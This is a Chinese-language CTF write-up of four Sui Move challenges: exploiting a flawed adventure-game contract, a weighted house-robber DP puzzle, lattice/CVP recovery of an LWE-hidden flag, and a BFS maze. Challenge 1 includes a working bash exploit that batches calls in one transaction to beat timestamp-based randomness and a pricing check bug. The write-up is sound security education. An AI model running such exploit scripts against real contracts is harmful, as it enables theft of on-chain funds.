[{"title":"SUI MOVE CTF 2025 (1-4) Write Up","url":"/2025/08/05/MOVE CTF 2025/","content":"# Sui Move CTF 2025(1-4) WriteUp\n\n## 概述\n\n本文档包含了四道Sui Move CTF挑战的完整解题过程，涵盖了智能合约漏洞利用、算法分析、密码学攻击和路径搜索等多个技术领域。每个题目都保留了完整的技术细节、代码实现和解题过程。\n\n## 目录\n\n1. [冒险游戏 - 智能合约漏洞利用](#1-冒险游戏)\n2. [强盗游戏 - 动态规划算法](#2-强盗游戏)\n3. [恢复密钥 - 格理论密码学](#3-恢复密钥)\n4. [迷宫游戏 - 路径搜索算法](#4-迷宫游戏)\n\n---\n\n# 1. 冒险游戏\n\n## 挑战概述\n\n这是一个基于Sui Move智能合约的CTF挑战，目标是通过利用合约漏洞获取Flag。挑战涉及一个冒险游戏，玩家需要控制英雄击败怪物来获得token，最终购买宝箱获取Flag。\n\n## 合约分析\n\n### 核心合约结构\n\n挑战包含三个主要模块：\n\n- `adventure.move` - 主要游戏逻辑\n- `hero.move` - 英雄系统\n- `inventory.move` - 物品和Flag系统\n\n### 关键漏洞发现\n\n#### 1. 体力消耗漏洞\n\n在 `slay_boar_king` 函数中发现关键漏洞：\n\n```rust\nentry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {\n    // ...\n    //hero::decrease_stamina(hero, 2);  // 这行被注释掉了！\n    // ...\n}\n```\n\n**影响**: 击败野猪王不消耗体力，可以无限次攻击。\n\n#### 2. 时间戳依赖漏洞\n\ntoken奖励基于时间戳：\n\n```rust\nif (fight_result == 1) {\n    let current_timestamp = clock::timestamp_ms(clock);\n    let d100 = current_timestamp % 3;\n\n    if (d100 == 1) {\n        // 增加5个token\n        *current_balance = *current_balance + 5;\n    } else {\n        // 减少5个token\n        *current_balance = *current_balance - 5;\n    }\n}\n```\n\n**影响**: 只有当 `timestamp % 3 == 1` 时才能获得token奖励。\n\n#### 3. 计费错误漏洞\n\n在 `buy_box` 函数中：\n\n```rust\nassert!(*current_balance >= 200, ERROR_NO_MONEY);  // 检查200\n*current_balance = *current_balance - 100;         // 但只扣除100\n```\n\n**影响**: 检查需要200个token但实际只扣除100个。\n\n## 攻击策略\n\n### 阶段1: 英雄战斗力提升\n\n发现英雄初始属性不足以击败野猪王：\n\n- 初始strength: 10\n- 野猪王defense: 10-15\n\n**解决方案**: 升级英雄系统\n\n- 击败普通野猪获得经验（每次+10经验）\n- 100经验可升级，升级后strength增加30点\n\n### 阶段2: PTB时间戳攻击\n\n利用Programmable Transaction Block (PTB)确保所有操作使用相同时间戳：\n\n1. 等待有利时间戳（`timestamp % 3 == 1`）\n2. 在单个PTB中执行20次 `slay_boar_king`调用\n3. 每次成功+5 token，从100增加到200\n\n### 阶段3: 购买宝箱获取Flag\n\n1. 利用计费错误购买宝箱（检查200但只扣100）\n2. 调用 `get_flag`函数获取Flag事件\n\n## 攻击实现\n\n### 英雄升级脚本\n\n```bash\n# 击败30只普通野猪获得经验\nfor i in {1..30}; do\n    sui client call --package $PACKAGE_ID --module adventure --function slay_boar \\\n        --args $HERO_ID --gas-budget 20000000\ndone\n\n# 升级英雄\nsui client call --package $PACKAGE_ID --module hero --function level_up \\\n    --args $HERO_ID --gas-budget 20000000\n```\n\n### PTB批量攻击脚本\n\n核心攻击脚本 `ptb_batch_attack.sh`：\n\n```bash\n#!/bin/bash\n\n# 合约配置\nPACKAGE_ID=\"0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d\"\nHERO_ID=\"0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134\"\nUSERS_TOKEN_AMOUNT_ID=\"0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45\"\nCLOCK_ID=\"0x6\"\n\n# PTB攻击函数\nexecute_ptb_attack() {\n    local batch_size=$1\n    PTB_CMD=\"sui client ptb\"\n  \n    # 构建20次slay_boar_king调用\n    for ((i=1; i<=batch_size; i++)); do\n        PTB_CMD=\"$PTB_CMD --move-call $PACKAGE_ID::adventure::slay_boar_king \\\"\\\" @$CLOCK_ID @$USERS_TOKEN_AMOUNT_ID @$HERO_ID\"\n    done\n  \n    PTB_CMD=\"$PTB_CMD --gas-budget 100000000\"\n    RESULT=$(eval $PTB_CMD 2>&1)\n  \n    # 检查Amount事件\n    if echo \"$RESULT\" | grep -q \"Amount\"; then\n        AMOUNT=$(echo \"$RESULT\" | grep -A 5 \"Amount\" | grep \"amount\" | tail -1 | grep -o '[0-9]\\+')\n        if [ \"$AMOUNT\" -ge 200 ]; then\n            return 0\n        fi\n    fi\n    return 1\n}\n\n# 主攻击循环\nfor attempt in $(seq 1 100); do\n    TIMESTAMP=$(date +%s)\n    REMAINDER=$((TIMESTAMP % 3))\n  \n    if [ $REMAINDER -eq 1 ]; then\n        echo \"🎯 发现有利时间戳! 执行PTB攻击!\"\n  \n        if execute_ptb_attack 20; then\n            # 购买宝箱\n            BUY_RESULT=$(sui client call --package $PACKAGE_ID --module adventure --function buy_box --args $USERS_TOKEN_AMOUNT_ID --gas-budget 20000000 2>&1)\n  \n            # 提取宝箱ID并获取Flag\n            TREASURY_BOX_ID=$(echo \"$BUY_RESULT\" | grep -A 10 \"Created Objects\" | grep \"ID:\" | head -1 | grep -o '0x[a-f0-9]\\{64\\}')\n  \n            FLAG_RESULT=$(sui client call --package $PACKAGE_ID --module inventory --function get_flag --args $TREASURY_BOX_ID --gas-budget 20000000 2>&1)\n  \n            FLAG_TX_HASH=$(echo \"$FLAG_RESULT\" | grep \"Transaction Digest:\" | grep -o '[A-Za-z0-9]\\{44\\}')\n            echo \"🏁 Flag交易哈希: $FLAG_TX_HASH\"\n            exit 0\n        fi\n    fi\n  \n    # 重置余额并等待下一次机会\n    sui client call --package $PACKAGE_ID --module adventure --function init_balances --args $USERS_TOKEN_AMOUNT_ID --gas-budget 10000000 > /dev/null 2>&1\n    sleep 1\ndone\n```\n\n## 攻击执行过程\n\n### 1. 环境准备\n\n```bash\n# 部署合约获取Package ID\nPackage ID: 0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d\nHero ID: 0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134\nUsersTokenAmount ID: 0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45\n```\n\n### 2. 英雄升级\n\n- 击败30只普通野猪获得160点经验\n- 升级英雄：strength 10→40, defense 5→20, hp 100→200\n\n### 3. PTB攻击\n\n- 等待时间戳余数为1的有利时机\n- 执行20次批量 `slay_boar_king`调用\n- 成功从100 token增加到200 token\n\n### 4. 获取Flag\n\n- 购买宝箱（利用计费错误）\n- 调用 `get_flag`获取Flag事件\n\n## 攻击结果\n\n**成功获取Flag交易哈希**: `23CBKEHSiwoB1TkJyhQAG1zhuHpWDLpHESdmeWSWs3Gs`\n\n## 技术要点总结\n\n1. **漏洞组合利用**: 体力消耗漏洞 + 时间戳依赖 + 计费错误\n2. **PTB时间戳同步**: 确保批量操作使用相同时间戳\n3. **英雄升级机制**: 发现并利用升级系统提升战斗力\n4. **概率攻击优化**: 从1/3成功率提升到100%成功率\n\n## 防御建议\n\n1. **修复体力消耗**: 取消注释 `hero::decrease_stamina(hero, 2)`\n2. **移除时间戳依赖**: 使用安全的随机数生成\n3. **修复计费错误**: 统一检查和扣除金额\n4. **限制批量操作**: 对PTB中的重复调用进行限制\n\n这次攻击展示了智能合约中多个看似无关的小漏洞如何被巧妙组合，形成完整的攻击链。\n\n## 详细技术分析\n\n### 时间戳攻击原理\n\nSui区块链中，同一个PTB内的所有操作共享相同的时间戳。这个特性被用来绕过随机性：\n\n```rust\nlet current_timestamp = clock::timestamp_ms(clock);\nlet d100 = current_timestamp % 3;\n```\n\n通过在shell中检查时间戳并在有利时机立即执行PTB，可以确保所有20次调用都获得奖励。\n\n### PTB构造技巧\n\n关键在于正确构造PTB命令：\n\n```bash\nsui client ptb \\\n  --move-call package::module::function \"\" @arg1 @arg2 @arg3 \\\n  --move-call package::module::function \"\" @arg1 @arg2 @arg3 \\\n  ... (重复20次)\n  --gas-budget 100000000\n```\n\n每个 `--move-call`代表一次函数调用，所有调用在同一个交易中执行。\n\n### 英雄升级数值分析\n\n升级前后战斗力对比：\n\n| 属性     | 升级前 | 升级后 | 提升 |\n| -------- | ------ | ------ | ---- |\n| Level    | 1      | 2      | +1   |\n| Strength | 10     | 40     | +30  |\n| Defense  | 5      | 20     | +15  |\n| HP       | 100    | 200    | +100 |\n\n野猪王属性范围：\n\n- HP: 180-220\n- Strength: 20-25\n- Defense: 10-15\n\n升级后英雄的40点攻击力可以轻松突破野猪王的10-15防御。\n\n## 攻击时间线\n\n1. **00:00** - 分析合约代码，发现多个漏洞\n2. **00:30** - 尝试直接攻击野猪王，发现战斗力不足\n3. **01:00** - 研究英雄升级机制\n4. **01:30** - 击败30只普通野猪，升级英雄\n5. **02:00** - 开发PTB攻击脚本\n6. **02:30** - 成功执行攻击，获取Flag\n\n## 关键代码片段\n\n### 漏洞代码1: 体力消耗被注释\n\n```rust\nentry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {\n    let sender = tx_context::sender(ctx);\n    assert!(hero::stamina(hero) > 0, EHERO_TIRED);\n    // ...\n    let fight_result = fight_monster<BoarKing>(hero, &boar);\n    //hero::decrease_stamina(hero, 2);  // ← 关键漏洞：被注释掉\n    // ...\n}\n```\n\n### 漏洞代码2: 时间戳依赖\n\n```rust\nif (fight_result == 1) {\n    let current_timestamp = clock::timestamp_ms(clock);\n    let d100 = current_timestamp % 3;  // ← 可预测的\"随机\"数\n\n    if (d100 == 1) {\n        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n        *current_balance = *current_balance + 5;  // 奖励\n        event::emit(Amount{amount: *current_balance});\n    } else {\n        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n        *current_balance = *current_balance - 5;  // 惩罚\n        event::emit(Amount{amount: *current_balance});\n    }\n}\n```\n\n### 漏洞代码3: 计费错误\n\n```rust\npublic entry fun buy_box(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext) {\n    let sender = tx_context::sender(ctx);\n    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);\n    event::emit(Amount{amount: *current_balance});\n    assert!(*current_balance >= 200, ERROR_NO_MONEY);  // ← 检查200\n    *current_balance = *current_balance - 100;         // ← 但只扣100\n    let box = inventory::create_treasury_box(ctx);\n    transfer::public_transfer(box, tx_context::sender(ctx));\n}\n```\n\n## 完整攻击脚本\n\n将攻击脚本保存为 `ptb_batch_attack.sh` 并执行：\n\n```bash\nchmod +x ptb_batch_attack.sh\n./ptb_batch_attack.sh\n```\n\n脚本会自动：\n\n1. 监控时间戳，等待有利时机\n2. 执行PTB批量攻击\n3. 购买宝箱并获取Flag\n4. 输出Flag交易哈希\n\n## 学习要点\n\n1. **代码审计重要性**: 仔细检查每一行代码，包括注释\n2. **漏洞组合威力**: 多个小漏洞组合可能产生严重影响\n3. **区块链特性利用**: 理解PTB等区块链特有机制\n4. **攻击链构造**: 从信息收集到最终利用的完整流程\n\n## 相关资源\n\n- [Sui Move 官方文档](https://docs.sui.io/concepts/sui-move-concepts)\n- [PTB 编程指南](https://docs.sui.io/concepts/transactions/prog-txn-blocks)\n- [智能合约安全最佳实践](https://github.com/slowmist/Knowledge-Base/blob/master/translations/move-security-guidelines-zh.md)\n\n---\n\n# 2. 强盗游戏\n\n## 题目信息\n\n- **题目名称**: 强盗游戏\n- **题目积分**: 52\n- **分类**: blockchain, hohctf, sui, move\n- **解题人数**: 46\n\n## 题目描述\n\n房屋加权的强盗游戏，你能成功获取目标金额吗？HOH moveCTF 强盗游戏\n\n题目提供了一个独特的 Sui Move 合约：\n\n- **Package ID**: `0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c`\n- **部署交易哈希**: `JB4yrd8L6srxeLv6mAhBo13sYdXqzVyJiXVCSXwQgvxY`\n\n## 解题思路\n\n### 1. 合约分析\n\n首先分析Move合约源码，发现这是一个基于动态规划的\"房屋强盗\"问题变种：\n\n```rust\nmodule game::ez_game {\n    public struct Challenge has key, store {\n        id: UID,\n        initial_part: vector<u64>,\n        weights: vector<u64>,\n        target_amount: u64,\n    }\n\n    public struct Flag has copy, drop {\n        owner: address,\n        flag: bool\n    }\n}\n```\n\n关键函数：\n\n- `init_game`: 初始化游戏，创建Challenge对象，设置随机目标金额(10-20)\n- `get_flag`: 验证用户输入，如果计算结果等于目标金额则触发Flag事件\n- `weighted_rob`: 加权房屋强盗算法核心实现\n\n### 2. 算法理解\n\n`weighted_rob`函数实现了一个动态规划算法：\n\n- 初始房屋：`[1, 1, 3, 1, 1]`\n- 初始权重：`[1, 1, 2, 1, 1]`\n- 用户可以添加额外房屋（权重默认为1）\n- 不能抢劫相邻的房屋\n- 每个房屋的价值 = 房屋值 × 权重\n- 目标：找到最大收益\n\n### 3. 解题脚本\n\n编写Python脚本分析所有可能的目标金额：\n\n```python\ndef weighted_rob(houses, weights):\n    n = len(houses)\n    if n == 0:\n        return 0\n\n    dp = []\n    dp.append(houses[0] * weights[0])\n\n    if n > 1:\n        dp.append(max(\n            houses[0] * weights[0],\n            houses[1] * weights[1]\n        ))\n\n    for i in range(2, n):\n        dp_i_1 = dp[i - 1]\n        dp_i_2_plus_house = dp[i - 2] + houses[i] * weights[i]\n        dp.append(max(dp_i_1, dp_i_2_plus_house))\n\n    return dp[n - 1]\n```\n\n通过分析发现所有目标金额的解决方案：\n\n- 目标金额 10 → 用户输入: [3]\n- 目标金额 11 → 用户输入: [4]\n- 目标金额 12 → 用户输入: [5]\n- ...\n- 目标金额 20 → 用户输入: [13]\n\n## 解题步骤\n\n### 1. 初始化游戏\n\n```bash\nsui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \\\n  --module ez_game --function init_game --args 0x8\n```\n\n创建了Challenge对象：`0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92`\n\n### 2. 查看Challenge对象\n\n```bash\nsui client object 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92\n```\n\n获取到关键信息：\n\n- **目标金额**: 15\n- **初始房屋**: [1, 1, 3, 1, 1]\n- **权重**: [1, 1, 2, 1, 1]\n\n### 3. 计算解决方案\n\n根据目标金额15，对应的用户输入是 `[8]`。\n\n验证计算过程：\n\n- 完整房屋列表：`[1, 1, 3, 1, 1, 8]`\n- 完整权重列表：`[1, 1, 2, 1, 1, 1]`\n- DP计算：\n  - dp[0] = 1 × 1 = 1\n  - dp[1] = max(1×1, 1×1) = 1\n  - dp[2] = max(1, 1 + 3×2) = 7\n  - dp[3] = max(7, 1 + 1×1) = 7\n  - dp[4] = max(7, 7 + 1×1) = 8\n  - dp[5] = max(8, 7 + 8×1) = 15 ✓\n\n### 4. 获取Flag\n\n```bash\nsui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \\\n  --module ez_game --function get_flag \\\n  --args \"[8]\" 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92\n```\n\n## 解题结果\n\n**成功触发Flag事件！**\n\n**触发Flag的交易哈希**: `3ZbbGVQkNLxuUACjdnRbLb5YF9NQ5MDuTiogDD3HYwaa`\n\n交易事件中显示：\n\n```json\n{\n  \"flag\": true,\n  \"owner\": \"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe\"\n}\n```\n\n## 关键技术点\n\n1. **Sui Move合约交互**: 理解Sui区块链的对象模型和交易机制\n2. **动态规划算法**: 掌握房屋强盗问题的经典DP解法\n3. **加权变种**: 理解权重对算法结果的影响\n4. **随机性处理**: 分析所有可能的目标金额并预计算解决方案\n\n## 总结\n\n这道题目巧妙地将经典的动态规划问题与区块链技术结合，考查了：\n\n- Move语言和Sui区块链的基础知识\n- 动态规划算法的理解和实现\n- 逆向分析和解题思维\n\n---\n\n# 3. 恢复密钥\n\n## 题目信息\n\n- **题目名称**: 恢复私钥\n- **题目积分**: 63\n- **分类**: blockchain, hohctf, sui, move\n- **解题人数**: 32\n- **题目描述**: 我在链上用随机数隐藏了我的私钥，但是我忘记我私钥的内容了，你能帮我恢复私钥嘛？\n\n## 题目环境\n\n- **Package ID**: `0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9`\n- **部署交易哈希**: `Go2jkNk5tR1EnCNV2Fw2zaP6zQfQRPfUeEFyyi6rtJiR`\n\n## 解题思路\n\n### 1. 题目分析\n\n这是一道结合了密码学和区块链技术的综合性CTF题目。通过分析提供的Move智能合约源码，可以发现：\n\n1. 题目使用线性代数加密方案隐藏flag\n2. 加密公式：`enc = A * flag + k`\n   - `A`: 64x23的固定矩阵\n   - `flag`: 23字节的明文（即我们要恢复的私钥）\n   - `k`: 64维随机向量\n   - `enc`: 64维密文向量\n\n### 2. 关键代码分析\n\n```rust\n// 加密函数\nentry fun entrypt_flag(plain_flag: vector<u8>, r: &Random, ctx: &mut TxContext) {\n    let a = get_a();  // 获取64x23矩阵\n    let mut k: vector<u64> = vector[];\n    // 生成64个随机数作为噪声\n    while(i < 64) {\n        k.push_back(random::generate_u64_in_range(&mut generator, 0, 4294967296));\n        i = i + 1;\n    };\n    // 执行加密: enc = A * flag + k\n    let enc = matadd(&matmul(&a, &ex_plain_flag), &k);\n}\n\n// 验证函数\npublic entry fun decrypt_flag(flag: vector<u8>, ctx: &mut TxContext) {\n    assert!(blake2b256(&flag) == x\"5c9d8d1c17561e80b1e29b4a7809b369eb94e3d8b6808c19c69e25f94f67817a\", 0);\n    event::emit(FlagEvent {\n        owner: ctx.sender(),\n        flag: true\n    });\n}\n```\n\n### 3. 密码学原理\n\n这是一个基于格理论的加密方案，类似于Learning With Errors (LWE) 问题。要解密需要解决最近向量问题（CVP - Closest Vector Problem）。\n\n## 解题步骤\n\n### 步骤1: 环境准备\n\n首先安装SageMath数学计算软件：\n\n```bash\nsudo apt update && sudo apt install -y sagemath\n```\n\n### 步骤2: 分析密文\n\n从合约源码中可以看到加密后的密文：\n\n```\n[13244763658160674624, 16984722715248776010, 13823152552092075312, ...]\n```\n\n### 步骤3: 使用CVP算法解密\n\n题目提供了解密脚本 `decrypt.sage`，核心算法是Babai CVP算法：\n\n```python\ndef Babai_CVP(Lattice, target):\n    M = Lattice.LLL()\n    G = M.gram_schmidt()[0]\n    diff = target\n    for i in reversed(range(M.nrows())):\n        diff -=  M[i] * ((diff * G[i]) / (G[i] * G[i])).round()\n    return target - diff\n```\n\n### 步骤4: 运行解密脚本\n\n```bash\ncd solve/tests\nsage decrypt.sage\n```\n\n输出结果：\n\n```\n[-]the flag length is: 23\n(102, 108, 97, 103, 123, 53, 85, 105, 95, 77, 48, 86, 101, 95, 67, 79, 78, 116, 114, 65, 67, 55, 125)\n[+]flag{5Ui_M0Ve_CONtrAC7}\n```\n\n### 步骤5: 验证flag\n\n使用Sui CLI调用链上合约验证flag：\n\n```bash\nsui client call \\\n  --package 0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9 \\\n  --module crypto \\\n  --function decrypt_flag \\\n  --args \"flag{5Ui_M0Ve_CONtrAC7}\" \\\n  --gas-budget 10000000\n```\n\n## 解题结果\n\n- **Flag**: `flag{5Ui_M0Ve_CONtrAC7}`\n- **交易哈希**: `2FPqgAyMe2e7qB5xigrwi35oTqrmwmuC45pCudHLdtVX`\n- **验证状态**: Success，成功触发FlagEvent\n\n## 技术要点\n\n### 1. 格理论基础\n\n- **格 (Lattice)**: 由基向量张成的离散点集\n- **CVP问题**: 给定格和目标向量，找到格中最接近目标的向量\n- **LLL算法**: 格基约化算法，用于找到较短的基向量\n\n### 2. Babai算法\n\nBabai算法是解决CVP问题的近似算法：\n\n1. 对格基进行LLL约化\n2. 使用Gram-Schmidt正交化\n3. 通过舍入操作找到最近向量\n\n### 3. Move智能合约\n\n- 使用Sui区块链的Move语言\n- 集成随机数生成器进行加密\n- 通过事件机制验证解题结果\n\n## 总结\n\n这道题目巧妙地结合了：\n\n- **密码学**: 基于格理论的加密方案\n- **数学**: 线性代数和最近向量问题\n- **区块链**: Sui Move智能合约技术\n\n解题的关键在于理解LWE类型的加密方案，并使用适当的格理论算法（CVP）来恢复明文。\n\n---\n\n# 4. 迷宫游戏\n\n## 题目信息\n\n- **题目名称**: 迷宫游戏\n- **题目描述**: 这是一道ctf题目 这里有一个迷宫游戏，你能顺利走出这个迷宫吗\n- **Package ID**: `0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20`\n- **部署交易哈希**: `AgCw1ZGx5GFHFJHFTgdqjaVqY2zLrMbSgtevJz29K6yz`\n- **区块链**: Sui Network\n- **语言**: Move\n\n## 题目分析\n\n### 1. 合约结构分析\n\n通过查看Move合约源码，发现这是一个基于Sui区块链的迷宫游戏：\n\n```rust\nconst ROW: u64 = 10;\nconst COL: u64 = 11;\nconst MAZE: vector<u8> = b\"#S########\\n#**#######\\n##*#######\\n##***#####\\n####*#####\\n##***###E#\\n##*#####*#\\n##*#####*#\\n##*******#\\n##########\";\nconst START_POS: u64 = 1;\n```\n\n### 2. 迷宫布局\n\n迷宫是一个10行11列的网格：\n\n```\n#S########\n#**#######\n##*#######\n##***#####\n####*#####\n##***###E#\n##*#####*#\n##*#####*#\n##*******#\n##########\n```\n\n- `#`: 墙壁\n- `S`: 起点 (位置1)\n- `E`: 终点 (位置63)\n- `*`: 可通行路径\n\n### 3. 游戏机制\n\n合约提供三个主要函数：\n\n1. **create_challenge()**: 创建挑战，生成ChallengeStatus对象\n2. **complete_challenge()**: 完成迷宫，需要提供正确的移动序列\n3. **claim_flag()**: 获取flag，需要挑战完成后调用\n\n移动控制：\n\n- `w` (ASCII 119): 向上移动\n- `s` (ASCII 115): 向下移动\n- `a` (ASCII 97): 向左移动\n- `d` (ASCII 100): 向右移动\n\n## 解题过程\n\n### 步骤1: 迷宫路径分析\n\n使用BFS算法分析迷宫，找到从起点S到终点E的最短路径。\n\n位置编号系统：\n\n- 位置 = 行 × 11 + 列\n- 起点S在位置1 (第0行第1列)\n- 终点E在位置63 (第5行第8列)\n\n### 步骤2: 路径搜索算法\n\n```python\ndef find_path():\n    from collections import deque\n\n    start_pos = 1  # S的位置\n    end_pos = 63   # E的位置\n\n    queue = deque([(start_pos, \"\")])\n    visited = set([start_pos])\n\n    while queue:\n        current_pos, path = queue.popleft()\n\n        if current_pos == end_pos:\n            return path\n\n        # 尝试四个方向的移动\n        moves = [\n            ('w', -11),  # 上\n            ('s', 11),   # 下\n            ('a', -1),   # 左\n            ('d', 1)     # 右\n        ]\n\n        for move_char, delta in moves:\n            new_pos = current_pos + delta\n            # 边界检查和墙壁检查\n            # ...\n```\n\n### 步骤3: 找到解决方案\n\n通过BFS搜索，找到最短路径：**`sdssddssaasssddddddwww`**\n\n路径验证：\n\n1. S(1) → s → 12(*) → d → 13(*) → s → 24(*) → s → 35(*)\n2. 35(*) → d → 36(*) → d → 37(*) → s → 48(*) → s → 59(*)\n3. 59(*) → a → 58(*) → a → 57(*) → s → 68(*) → s → 79(*)\n4. 79(*) → s → 90(*) → d → 91(*) → d → 92(*) → d → 93(*)\n5. 93(*) → d → 94(*) → d → 95(*) → d → 96(*) → w → 85(*)\n6. 85(*) → w → 74(*) → w → 63(E) ✅\n\n## 链上执行\n\n### 步骤1: 创建挑战\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function create_challenge \\\n  --gas-budget 10000000\n```\n\n**结果**:\n\n- Transaction Digest: `BUYeRta41EpQuNTFC41Rj1HYP3m1kfXSGffqgiNGCE5Z`\n- Challenge Object ID: `0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55`\n\n### 步骤2: 完成迷宫挑战\n\n将路径字符串转换为字节数组：\n\n- `sdssddssaasssddddddwww` → `[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]`\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function complete_challenge \\\n  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 '[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]' \\\n  --gas-budget 10000000\n```\n\n**结果**:\n\n- Transaction Digest: `FfbrP2KJemjqbmHJLpCQtthNTnEz7Fs1H6Emop4amqtx`\n- 触发Success事件，路径验证成功\n\n### 步骤3: 获取Flag\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function claim_flag \\\n  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 \\\n  --gas-budget 10000000\n```\n\n**结果**:\n\n- **Transaction Digest**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`\n- 触发FlagEvent事件，success: true\n\n## 关键技术点\n\n### 1. Move合约分析\n\n- 理解Sui Move语法和结构\n- 分析entry函数的参数要求\n- 理解事件机制\n\n### 2. 算法应用\n\n- BFS最短路径搜索\n- 二维网格坐标转换\n- 边界条件处理\n\n### 3. 区块链交互\n\n- Sui CLI工具使用\n- 交易参数格式化\n- 对象ID管理\n\n### 4. 数据转换\n\n- 字符串到字节数组转换\n- ASCII码映射\n- Move类型系统理解\n\n## 总结\n\n这道题目考查了：\n\n1. **Move智能合约分析能力**\n2. **图论算法应用** (BFS路径搜索)\n3. **区块链工具使用** (Sui CLI)\n4. **数据格式转换** (字符串→字节数组)\n\n**最终答案**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`\n\n**Flag**: `CTF{Letsmovectf}`\n\n## 工具和脚本\n\n解题过程中使用的Python脚本可以帮助：\n\n- 迷宫可视化和路径搜索\n- 字节数组格式转换\n- 自动化区块链交互\n\n---\n\n# 综合技术总结\n\n## 核心技能矩阵\n\n### 1. Move智能合约分析\n\n- **语法理解**: 掌握Sui Move的基本语法和类型系统\n- **漏洞识别**: 能够发现注释代码、计费错误等常见漏洞\n- **对象模型**: 理解Sui的对象所有权和转移机制\n- **事件系统**: 掌握事件的触发和监听机制\n\n### 2. 算法与数据结构\n\n- **动态规划**: 房屋强盗问题的经典DP解法及其变种\n- **图论算法**: BFS在路径搜索中的应用\n- **格理论**: CVP问题和LLL算法的实际应用\n- **时间复杂度**: 算法效率分析和优化\n\n### 3. 密码学知识\n\n- **LWE问题**: Learning With Errors加密方案的原理\n- **格基约化**: LLL算法和Babai算法的实现\n- **最近向量问题**: CVP的数学背景和解决方法\n- **哈希函数**: Blake2b等密码学哈希的应用\n\n### 4. 区块链技术\n\n- **Sui CLI**: 命令行工具的熟练使用\n- **PTB机制**: Programmable Transaction Block的构造和执行\n- **时间戳攻击**: 利用区块链时间戳特性的攻击方法\n- **Gas优化**: 交易费用的估算和优化\n\n## 攻击技术分类\n\n### 1. 智能合约漏洞利用\n\n- **代码审计**: 发现被注释的关键代码\n- **逻辑错误**: 利用计费不一致等业务逻辑漏洞\n- **状态管理**: 利用状态更新的时序问题\n- **权限控制**: 绕过访问控制机制\n\n### 2. 时间相关攻击\n\n- **时间戳依赖**: 利用可预测的时间戳生成随机数\n- **PTB同步**: 确保批量操作使用相同时间戳\n- **时序攻击**: 利用操作执行的时间差\n\n### 3. 数学攻击\n\n- **算法逆向**: 通过分析算法找到逆向求解方法\n- **概率分析**: 计算攻击成功的概率并优化策略\n- **密码学攻击**: 使用高级数学工具破解加密方案\n\n### 4. 自动化攻击\n\n- **脚本编写**: 开发自动化攻击脚本\n- **批量操作**: 通过PTB执行大量重复操作\n- **条件触发**: 等待有利条件自动执行攻击\n\n## 防御策略建议\n\n### 1. 代码安全\n\n- **完整性检查**: 确保所有必要的代码都被执行\n- **逻辑一致性**: 检查和扣费逻辑必须保持一致\n- **边界验证**: 严格验证所有输入参数的边界条件\n- **状态同步**: 确保状态更新的原子性\n\n### 2. 随机数安全\n\n- **真随机源**: 使用密码学安全的随机数生成器\n- **时间戳避免**: 不要依赖可预测的时间戳\n- **熵源多样化**: 结合多个熵源生成随机数\n- **随机性测试**: 定期测试随机数的质量\n\n### 3. 访问控制\n\n- **权限最小化**: 只授予必要的最小权限\n- **多重验证**: 关键操作需要多重验证\n- **时间锁**: 对重要操作添加时间延迟\n- **频率限制**: 限制高频操作的执行\n\n### 4. 监控和审计\n\n- **事件监控**: 实时监控异常事件和模式\n- **交易分析**: 分析可疑的交易模式\n- **代码审计**: 定期进行专业的代码安全审计\n- **渗透测试**: 定期进行安全渗透测试\n\n## 结论\n\n这四道Sui Move CTF题目展示了区块链安全的多个重要方面：\n\n1. **技术深度**: 从基础的路径搜索到高级的格理论密码学\n2. **攻击复杂性**: 从单一漏洞利用到多漏洞组合攻击\n3. **工具多样性**: 从简单的CLI工具到复杂的数学软件\n4. **思维方式**: 从逆向分析到正向构造的完整思维链\n\n通过系统性的分析和攻击，我们不仅获得了所有Flag，更重要的是：\n\n- 深入理解了Move智能合约的安全特性\n- 掌握了多种攻击技术和防御策略\n- 提高了综合的安全分析和解决问题的能力\n- 